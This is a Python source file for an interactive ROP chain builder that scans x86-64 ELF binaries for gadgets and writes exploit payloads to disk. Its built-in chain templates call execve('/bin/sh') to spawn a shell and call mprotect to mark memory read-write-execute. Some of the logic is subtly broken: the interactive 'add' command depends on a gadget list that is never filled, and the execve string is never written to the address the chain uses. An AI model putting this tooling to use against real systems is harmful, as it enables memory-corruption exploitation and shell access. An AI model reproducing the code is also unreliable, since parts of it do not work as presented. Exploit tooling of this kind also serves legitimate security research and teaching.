#!/usr/bin/env python3
import sys
import re
import struct
import subprocess
import argparse
import os
from collections import defaultdict
from elftools.elf.elffile import ELFFile
from capstone import Cs, CS_ARCH_X86, CS_MODE_64


class ROPGadget:
    """Represents a single ROP gadget with its address, instructions, and metadata."""
    
    def __init__(self, address, instructions, bytes_sequence):
        self.address = address
        self.instructions = instructions
        self.bytes = bytes_sequence
        self.size = len(bytes_sequence)
        
        # Extract registers modified by this gadget
        self.modified_regs = self._extract_modified_regs()
        
        # Extract registers read by this gadget
        self.read_regs = self._extract_read_regs()
        
    def _extract_modified_regs(self):
        """Extract registers that are modified by this gadget."""
        modified = set()
        reg_pattern = r'(rax|rbx|rcx|rdx|rsi|rdi|rbp|rsp|r8|r9|r10|r11|r12|r13|r14|r15)'
        
        for instr in self.instructions:
            if 'pop' in instr:
                match = re.search(r'pop (%s)' % reg_pattern, instr)
                if match:
                    modified.add(match.group(1))
            elif 'mov' in instr:
                match = re.search(r'mov (%s),' % reg_pattern, instr)
                if match:
                    modified.add(match.group(1))
                    
        return modified
        
    def _extract_read_regs(self):
        """Extract registers that are read by this gadget."""
        read = set()
        reg_pattern = r'(rax|rbx|rcx|rdx|rsi|rdi|rbp|rsp|r8|r9|r10|r11|r12|r13|r14|r15)'
        
        for instr in self.instructions:
            if 'mov' in instr:
                match = re.search(r'mov \w+, (%s)' % reg_pattern, instr)
                if match:
                    read.add(match.group(1))
            elif any(op in instr for op in ['add', 'sub', 'xor', 'and', 'or']):
                match = re.search(r'\w+ \w+, (%s)' % reg_pattern, instr)
                if match:
                    read.add(match.group(1))
                    
        return read
        
    def __str__(self):
        return f"0x{self.address:016x}: {' ; '.join(self.instructions)}"
        
    def __repr__(self):
        return self.__str__()


class ROPChain:
    """Represents a ROP chain being constructed."""
    
    def __init__(self, architecture='x86_64'):
        self.chain = []
        self.architecture = architecture
        self.stack_pointer_offset = 0
        
    def add_gadget(self, gadget, parameters=None):
        """Add a gadget to the ROP chain with optional parameters."""
        self.chain.append((gadget, parameters))
        self.stack_pointer_offset += 8  # Address size for x64
        
        # Account for parameters that will be popped by the gadget
        if parameters:
            self.stack_pointer_offset += 8 * len(parameters)
            
    def add_raw_address(self, address):
        """Add a raw address to the ROP chain."""
        self.chain.append((address, None))
        self.stack_pointer_offset += 8  # Address size for x64
        
    def add_data(self, data):
        """Add raw data (e.g., string) to the ROP chain."""
        # Align to 8 bytes for x64
        aligned_data = data
        if len(data) % 8 != 0:
            padding = b'\x00' * (8 - (len(data) % 8))
            aligned_data = data + padding
            
        self.chain.append((aligned_data, None))
        self.stack_pointer_offset += len(aligned_data)
        
    def generate_payload(self):
        """Generate the final payload bytes for the ROP chain."""
        payload = b''
        
        for item, params in self.chain:
            if isinstance(item, ROPGadget):
                payload += struct.pack('<Q', item.address)
                if params:
                    for param in params:
                        if isinstance(param, int):
                            payload += struct.pack('<Q', param)
                        else:
                            payload += param
            elif isinstance(item, int):
                payload += struct.pack('<Q', item)
            else:
                payload += item
                
        return payload
        
    def print_chain(self):
        """Print a human-readable representation of the ROP chain."""
        offset = 0
        print("\n=== ROP Chain ===")
        print(f"{'Offset':10} | {'Value':18} | Description")
        print("-" * 60)
        
        for item, params in self.chain:
            if isinstance(item, ROPGadget):
                print(f"{offset:10} | 0x{item.address:016x} | {' ; '.join(item.instructions)}")
                offset += 8
                if params:
                    for i, param in enumerate(params):
                        if isinstance(param, int):
                            print(f"{offset:10} | 0x{param:016x} | Parameter {i+1}")
                            offset += 8
                        else:
                            desc = f"Data: {param[:20]}"
                            if len(param) > 20:
                                desc += "..."
                            print(f"{offset:10} | {param.hex()[:16]:18} | {desc}")
                            offset += len(param)
                            # Padding for alignment
                            if len(param) % 8 != 0:
                                padding = 8 - (len(param) % 8)
                                offset += padding
            elif isinstance(item, int):
                print(f"{offset:10} | 0x{item:016x} | Raw address")
                offset += 8
            else:
                desc = f"Data: {item[:20]}"
                if len(item) > 20:
                    desc += "..."
                print(f"{offset:10} | {item.hex()[:16]:18} | {desc}")
                offset += len(item)
                # Padding for alignment
                if len(item) % 8 != 0:
                    padding = 8 - (len(item) % 8)
                    offset += padding
                    
        print("\nTotal chain size: {} bytes".format(offset))


class ROPChainGenerator:
    """Main class for ROP chain generation and binary analysis."""
    
    def __init__(self, binary_path, max_gadget_size=5, min_gadget_size=1):
        self.binary_path = binary_path
        self.max_gadget_size = max_gadget_size
        self.min_gadget_size = min_gadget_size
        self.gadgets = []
        self.gadget_by_instruction = defaultdict(list)
        self.gadget_by_modified_reg = defaultdict(list)
        self.binary_data = None
        self.base_address = 0
        self.text_section = None
        self.plt_section = None
        self.got_plt_section = None
        self.libc_base = 0
        self.libc_functions = {}
        
        # Load the binary
        self._load_binary()
        
        # Find gadgets
        self._find_gadgets()
        
        # Index gadgets
        self._index_gadgets()
        
    def _load_binary(self):
        """Load the binary file and extract relevant information."""
        try:
            with open(self.binary_path, 'rb') as f:
                self.binary_data = f.read()
                
            with open(self.binary_path, 'rb') as f:
                elf = ELFFile(f)
                
                # Get base address
                self.base_address = 0
                for segment in elf.iter_segments():
                    if segment['p_type'] == 'PT_LOAD':
                        self.base_address = segment['p_vaddr']
                        break
                
                # Get text section
                text_section = elf.get_section_by_name('.text')
                if text_section:
                    self.text_section = {
                        'offset': text_section['sh_offset'],
                        'addr': text_section['sh_addr'],
                        'size': text_section['sh_size'],
                        'data': text_section.data()
                    }
                
                # Get PLT section
                plt_section = elf.get_section_by_name('.plt')
                if plt_section:
                    self.plt_section = {
                        'offset': plt_section['sh_offset'],
                        'addr': plt_section['sh_addr'],
                        'size': plt_section['sh_size'],
                        'data': plt_section.data()
                    }
                
                # Get GOT.PLT section
                got_plt_section = elf.get_section_by_name('.got.plt')
                if got_plt_section:
                    self.got_plt_section = {
                        'offset': got_plt_section['sh_offset'],
                        'addr': got_plt_section['sh_addr'],
                        'size': got_plt_section['sh_size'],
                        'data': got_plt_section.data()
                    }
                
                # Extract symbols
                self._extract_symbols(elf)
                
        except Exception as e:
            print(f"[!] Error loading binary: {str(e)}")
            sys.exit(1)
            
    def _extract_symbols(self, elf):
        """Extract symbols from the binary."""
        self.symbols = {}
        
        for section in elf.iter_sections():
            if section.name == '.symtab' or section.name == '.dynsym':
                for symbol in section.iter_symbols():
                    if symbol.name and symbol['st_value'] != 0:
                        self.symbols[symbol.name] = symbol['st_value']
                        
    def _find_gadgets(self):
        """Find ROP gadgets in the binary."""
        if not self.text_section:
            print("[!] No .text section found in binary")
            return
            
        # Initialize Capstone disassembler
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        md.detail = True
        
        section_data = self.text_section['data']
        section_addr = self.text_section['addr']
        
        # Find all 'ret' instructions
        ret_offsets = []
        for i in range(len(section_data)):
            # 0xc3 = ret
            if section_data[i] == 0xc3:
                ret_offsets.append(i)
        
        print(f"[*] Found {len(ret_offsets)} potential ret instructions")
        
        # For each ret, look back to find gadgets
        for ret_offset in ret_offsets:
            for gadget_size in range(self.min_gadget_size, self.max_gadget_size + 1):
                start_offset = max(0, ret_offset - gadget_size * 15)  # x86-64 instructions can be up to 15 bytes
                
                # Skip if we've already processed this as part of a larger gadget
                if start_offset < ret_offset and any(g.address <= section_addr + start_offset and
                                                    g.address + g.size > section_addr + start_offset
                                                    for g in self.gadgets):
                    continue
                
                # Disassemble from start_offset to ret_offset + 1 (include the ret)
                gadget_bytes = section_data[start_offset:ret_offset + 1]
                
                # Check all possible starting points
                for i in range(len(gadget_bytes)):
                    if start_offset + i >= ret_offset:
                        break
                        
                    try:
                        instructions = []
                        cur_bytes = gadget_bytes[i:]
                        
                        for insn in md.disasm(cur_bytes, section_addr + start_offset + i):
                            if section_addr + start_offset + i + len(cur_bytes) >= section_addr + ret_offset + 1:
                                instructions.append(f"{insn.mnemonic} {insn.op_str}")
                                
                                # If we've reached the ret instruction, we have a valid gadget
                                if insn.mnemonic == 'ret' and insn.address == section_addr + ret_offset:
                                    if len(instructions) > 1:  # Only add if we have more than just 'ret'
                                        gadget = ROPGadget(
                                            section_addr + start_offset + i,
                                            instructions,
                                            section_data[start_offset + i:ret_offset + 1]
                                        )
                                        self.gadgets.append(gadget)
                                    break
                    except Exception:
                        continue
        
        print(f"[*] Found {len(self.gadgets)} gadgets")
        
    def _index_gadgets(self):
        """Index gadgets by instructions and modified registers for quick lookup."""
        for gadget in self.gadgets:
            # Index by instruction pattern
            for instr in gadget.instructions:
                # Extract instruction without operands
                base_instr = instr.split()[0]
                self.gadget_by_instruction[base_instr].append(gadget)
                
                # Also index full instruction
                self.gadget_by_instruction[instr].append(gadget)
            
            # Index by modified register
            for reg in gadget.modified_regs:
                self.gadget_by_modified_reg[reg].append(gadget)
                
    def find_gadgets_by_instruction(self, instruction_pattern):
        """Find gadgets that match an instruction pattern."""
        if instruction_pattern in self.gadget_by_instruction:
            return self.gadget_by_instruction[instruction_pattern]
            
        # Try regex matching
        matching_gadgets = []
        pattern = re.compile(instruction_pattern)
        
        for gadget in self.gadgets:
            for instr in gadget.instructions:
                if pattern.search(instr):
                    matching_gadgets.append(gadget)
                    break
                    
        return matching_gadgets
        
    def find_gadgets_by_modified_reg(self, register):
        """Find gadgets that modify a specific register."""
        return self.gadget_by_modified_reg.get(register, [])
        
    def find_syscall_gadgets(self):
        """Find syscall gadgets."""
        return self.find_gadgets_by_instruction('syscall')
        
    def find_plt_functions(self):
        """Find functions in the PLT."""
        plt_functions = {}
        
        if not self.plt_section or not self.got_plt_section:
            return plt_functions
            
        # Initialize Capstone disassembler
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        
        for name, addr in self.symbols.items():
            if name.startswith(('_', '.')):
                continue
                
            # Check if address is in PLT
            if self.plt_section['addr'] <= addr < self.plt_section['addr'] + self.plt_section['size']:
                plt_functions[name] = addr
                
        return plt_functions
        
    def create_rop_chain(self):
        """Create a new ROP chain."""
        return ROPChain()
        
    def suggest_chain_for_execve(self, command="/bin/sh"):
        """Suggest a ROP chain for executing execve("/bin/sh", NULL, NULL)."""
        chain = self.create_rop_chain()
        
        # Find gadgets for setting up syscall arguments
        pop_rdi = self.find_gadgets_by_instruction('pop rdi')
        pop_rsi = self.find_gadgets_by_instruction('pop rsi')
        pop_rdx = self.find_gadgets_by_instruction('pop rdx')
        syscall_gadgets = self.find_syscall_gadgets()
        
        if not pop_rdi or not pop_rsi or not pop_rdx or not syscall_gadgets:
            print("[!] Missing required gadgets for execve syscall")
            return None
            
        # Prepare string data for "/bin/sh"
        command_bytes = command.encode() + b'\x00'
        
        # Building the payload structure
        print("[*] Building execve ROP chain")
        
        # 1. Find a location to store the command string
        # For simplicity, we'll use the end of our ROP chain
        string_address = None
        
        # Let's try to find a writable section
        for section_name in ['.data', '.bss']:
            if section_name in self.symbols:
                string_address = self.symbols[section_name]
                break
        
        if not string_address:
            print("[!] No suitable data section found for command string")
            # For demonstration, we'll just add it to the end of our ROP chain
            # In a real exploit, you'd need a known writable address
            string_address = 0xdeadbeef  # Placeholder
            
        # 2. Set up registers for execve syscall
        # rax = 59 (execve syscall number)
        pop_rax = self.find_gadgets_by_instruction('pop rax')
        if not pop_rax:
            print("[!] No 'pop rax' gadget found")
            return None
            
        chain.add_gadget(pop_rax[0], [59])
        
        # rdi = pointer to "/bin/sh"
        chain.add_gadget(pop_rdi[0], [string_address])
        
        # rsi = NULL (argv)
        chain.add_gadget(pop_rsi[0], [0])
        
        # rdx = NULL (envp)
        chain.add_gadget(pop_rdx[0], [0])
        
        # Execute syscall
        chain.add_gadget(syscall_gadgets[0])
        
        # Add command string data
        chain.add_data(command_bytes)
        
        return chain
        
    def suggest_chain_for_mprotect(self, address, size):
        """Suggest a ROP chain for calling mprotect to make a region executable."""
        chain = self.create_rop_chain()
        
        # Find gadgets for setting up syscall arguments
        pop_rdi = self.find_gadgets_by_instruction('pop rdi')
        pop_rsi = self.find_gadgets_by_instruction('pop rsi')
        pop_rdx = self.find_gadgets_by_instruction('pop rdx')
        syscall_gadgets = self.find_syscall_gadgets()
        
        if not pop_rdi or not pop_rsi or not pop_rdx or not syscall_gadgets:
            print("[!] Missing required gadgets for mprotect syscall")
            return None
            
        # Building the payload structure
        print("[*] Building mprotect ROP chain")
        
        # Set up registers for mprotect syscall
        # rax = 10 (mprotect syscall number)
        pop_rax = self.find_gadgets_by_instruction('pop rax')
        if not pop_rax:
            print("[!] No 'pop rax' gadget found")
            return None
            
        chain.add_gadget(pop_rax[0], [10])
        
        # rdi = address (page-aligned)
        page_aligned_addr = address & ~0xFFF
        chain.add_gadget(pop_rdi[0], [page_aligned_addr])
        
        # rsi = size (page-aligned)
        page_aligned_size = ((size + 0xFFF) & ~0xFFF)
        chain.add_gadget(pop_rsi[0], [page_aligned_size])
        
        # rdx = 7 (PROT_READ | PROT_WRITE | PROT_EXEC)
        chain.add_gadget(pop_rdx[0], [7])
        
        # Execute syscall
        chain.add_gadget(syscall_gadgets[0])
        
        return chain
        
    def print_gadget_stats(self):
        """Print statistics about found gadgets."""
        instruction_counts = defaultdict(int)
        
        for gadget in self.gadgets:
            for instr in gadget.instructions:
                base_instr = instr.split()[0]
                instruction_counts[base_instr] += 1
                
        print("\n=== Gadget Statistics ===")
        print(f"Total gadgets found: {len(self.gadgets)}")
        print("\nTop 10 instruction types:")
        
        for instr, count in sorted(instruction_counts.items(), key=lambda x: x[1], reverse=True)[:10]:
            print(f"  {instr:10}: {count}")
            
        # Print register manipulation gadgets
        print("\nRegister manipulation gadgets:")
        for reg in ['rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi', 'rbp', 'rsp', 'r8', 'r9', 'r10', 'r11', 'r12', 'r13', 'r14', 'r15']:
            count = len(self.gadget_by_modified_reg.get(reg, []))
            if count > 0:
                print(f"  Modify {reg:4}: {count}")
                
    def export_all_gadgets(self, output_file):
        """Export all found gadgets to a file."""
        with open(output_file, 'w') as f:
            for gadget in sorted(self.gadgets, key=lambda g: g.address):
                f.write(f"0x{gadget.address:016x}: {' ; '.join(gadget.instructions)}\n")
                
        print(f"[*] Exported {len(self.gadgets)} gadgets to {output_file}")
        
    def search_gadget_pattern(self, pattern):
        """Search for gadgets matching a specific pattern."""
        results = []
        try:
            regex = re.compile(pattern)
            for gadget in self.gadgets:
                gadget_str = ' ; '.join(gadget.instructions)
                if regex.search(gadget_str):
                    results.append(gadget)
        except re.error:
            # If regex fails, try simple substring search
            for gadget in self.gadgets:
                gadget_str = ' ; '.join(gadget.instructions)
                if pattern in gadget_str:
                    results.append(gadget)
                    
        return results


class InteractiveROPBuilder:
    """Interactive mode for building ROP chains."""
    
    def __init__(self, generator):
        self.generator = generator
        self.chain = generator.create_rop_chain()
        
    def run(self):
        """Run the interactive ROP chain builder."""
        print("\n=== Interactive ROP Chain Builder ===")
        print("Enter 'help' for a list of commands.")
        
        while True:
            try:
                cmd = input("\nROP> ").strip()
                if not cmd:
                    continue
                    
                parts = cmd.split()
                command = parts[0].lower()
                
                if command == 'exit' or command == 'quit':
                    break
                    
                elif command == 'help':
                    self._print_help()
                    
                elif command == 'search':
                    if len(parts) < 2:
                        print("[!] Usage: search <pattern>")
                        continue
                        
                    pattern = ' '.join(parts[1:])
                    gadgets = self.generator.search_gadget_pattern(pattern)
                    
                    print(f"\nFound {len(gadgets)} matching gadgets:")
                    for i, gadget in enumerate(gadgets[:20]):
                        print(f"{i:3}: {gadget}")
                        
                    if len(gadgets) > 20:
                        print(f"...and {len(gadgets) - 20} more (use 'search <pattern> | more' to see all)")
                        
                elif command == 'add':
                    if len(parts) < 2:
                        print("[!] Usage: add <gadget_index> [param1 param2 ...]")
                        continue
                        
                    try:
                        index = int(parts[1])
                        if not self._current_gadgets or index >= len(self._current_gadgets):
                            print("[!] Invalid gadget index")
                            continue
                            
                        gadget = self._current_gadgets[index]
                        params = []
                        
                        for i in range(2, len(parts)):
                            param = parts[i]
                            if param.startswith('0x'):
                                params.append(int(param, 16))
                            else:
                                try:
                                    params.append(int(param))
                                except ValueError:
                                    # Assume it's a string
                                    params.append(param.encode() + b'\x00')
                                    
                        self.chain.add_gadget(gadget, params if params else None)
                        print(f"[+] Added gadget: {gadget}")
                        
                    except ValueError:
                        print("[!] Invalid index or parameter")
                        
                elif command == 'addr':
                    if len(parts) < 2:
                        print("[!] Usage: addr <address>")
                        continue
                        
                    try:
                        addr = int(parts[1], 16) if parts[1].startswith('0x') else int(parts[1])
                        self.chain.add_raw_address(addr)
                        print(f"[+] Added raw address: 0x{addr:016x}")
                    except ValueError:
                        print("[!] Invalid address")
                        
                elif command == 'data':
                    if len(parts) < 2:
                        print("[!] Usage: data <hex_data or string>")
                        continue
                        
                    data = ' '.join(parts[1:])
                    if data.startswith('"') and data.endswith('"'):
                        # String data
                        data = data[1:-1].encode() + b'\x00'
                    else:
                        try:
                            # Hex data
                            data = bytes.fromhex(data.replace('0x', '').replace(' ', ''))
                        except ValueError:
                            print("[!] Invalid hex data")
                            continue
                            
                    self.chain.add_data(data)
                    print(f"[+] Added data: {data.hex()[:32]}...")
                    
                elif command == 'print' or command == 'show':
                    self.chain.print_chain()
                    
                elif command == 'generate' or command == 'export':
                    if len(parts) < 2:
                        print("[!] Usage: generate <filename>")
                        continue
                        
                    filename = parts[1]
                    payload = self.chain.generate_payload()
                    
                    with open(filename, 'wb') as f:
                        f.write(payload)
                        
                    print(f"[+] Exported {len(payload)} bytes to {filename}")
                    
                elif command == 'clear':
                    self.chain = self.generator.create_rop_chain()
                    print("[+] Cleared ROP chain")
                    
                elif command == 'suggest':
                    self._handle_suggest_command(parts[1:] if len(parts) > 1 else [])
                    
                else:
                    print(f"[!] Unknown command: {command}")
                    
            except Exception as e:
                print(f"[!] Error: {str(e)}")
                
    def _handle_suggest_command(self, args):
        """Handle the 'suggest' command for built-in chain suggestions."""
        if not args:
            print("[!] Usage: suggest <type> [args...]")
            print("Available types: execve, mprotect")
            return
            
        chain_type = args[0].lower()
        
        if chain_type == 'execve':
            command = "/bin/sh"
            if len(args) > 1:
                command = args[1]
                
            chain = self.generator.suggest_chain_for_execve(command)
            if chain:
                self.chain = chain
                print(f"[+] Generated execve ROP chain for '{command}'")
                self.chain.print_chain()
            else:
                print("[!] Failed to generate execve ROP chain")
                
        elif chain_type == 'mprotect':
            if len(args) < 3:
                print("[!] Usage: suggest mprotect <address> <size>")
                return
                
            try:
                address = int(args[1], 16) if args[1].startswith('0x') else int(args[1])
                size = int(args[2], 16) if args[2].startswith('0x') else int(args[2])
                
                chain = self.generator.suggest_chain_for_mprotect(address, size)
                if chain:
                    self.chain = chain
                    print(f"[+] Generated mprotect ROP chain for 0x{address:x} (size: {size})")
                    self.chain.print_chain()
                else:
                    print("[!] Failed to generate mprotect ROP chain")
                    
            except ValueError:
                print("[!] Invalid address or size")
                
        else:
            print(f"[!] Unknown chain type: {chain_type}")
            print("Available types: execve, mprotect")
            
    def _print_help(self):
        """Print help information."""
        help_text = """
Commands:
  search <pattern>           - Search for gadgets matching pattern
  add <index> [params...]    - Add gadget from last search with optional parameters
  addr <address>             - Add raw address to chain
  data "<string>" or <hex>   - Add data to chain (string or hex)
  print / show               - Show current ROP chain
  generate <filename>        - Generate payload and save to file
  clear                      - Clear current ROP chain
  suggest execve [command]   - Suggest ROP chain for execve syscall
  suggest mprotect <addr> <size> - Suggest ROP chain for mprotect syscall
  help                       - Show this help
  exit / quit                - Exit the builder
"""
        print(help_text)


def main():
    parser = argparse.ArgumentParser(description='ROP Chain Generator Framework')
    parser.add_argument('binary', help='Path to the binary file')
    parser.add_argument('-o', '--output', help='Output file for gadgets list')
    parser.add_argument('-m', '--max-size', type=int, default=5, help='Maximum gadget size (instructions)')
    parser.add_argument('-i', '--interactive', action='store_true', help='Start interactive mode')
    parser.add_argument('-s', '--search', help='Search for gadgets matching pattern')
    parser.add_argument('--stats', action='store_true', help='Print gadget statistics')
    
    args = parser.parse_args()
    
    if not os.path.exists(args.binary):
        print(f"[!] File not found: {args.binary}")
        return
        
    print(f"[*] Analyzing binary: {args.binary}")
    generator = ROPChainGenerator(args.binary, max_gadget_size=args.max_size)
    
    if args.stats:
        generator.print_gadget_stats()
        
    if args.search:
        gadgets = generator.search_gadget_pattern(args.search)
        print(f"\nFound {len(gadgets)} gadgets matching '{args.search}':")
        for gadget in gadgets:
            print(f"0x{gadget.address:016x}: {' ; '.join(gadget.instructions)}")
            
    if args.output:
        generator.export_all_gadgets(args.output)
        
    if args.interactive:
        builder = InteractiveROPBuilder(generator)
        builder.run()
        

if __name__ == "__main__":
    main()